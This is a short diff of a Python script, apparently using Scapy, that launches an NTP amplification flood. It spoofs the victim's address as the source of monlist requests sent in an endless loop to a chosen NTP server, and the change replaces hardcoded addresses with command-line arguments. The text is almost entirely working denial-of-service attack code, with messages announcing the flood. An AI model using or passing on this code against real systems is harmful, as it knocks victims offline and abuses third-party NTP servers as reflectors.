@@ -9,5 +9,5 @@ ntpserver=sys.argv[2]
 data=str("\x17\x00\x03\x2a") + str("\x00")*4
 print "Starting to flood: "+ target + " using NTP: " + ntpserver
 print "Use CTRL+C to stop attack"
-packet = IP(dst="91.237.196.20",src="1.2.3.4")/UDP(sport=48947,dport=123)/Raw(load=data)
+packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data)
 send(packet,loop=1)
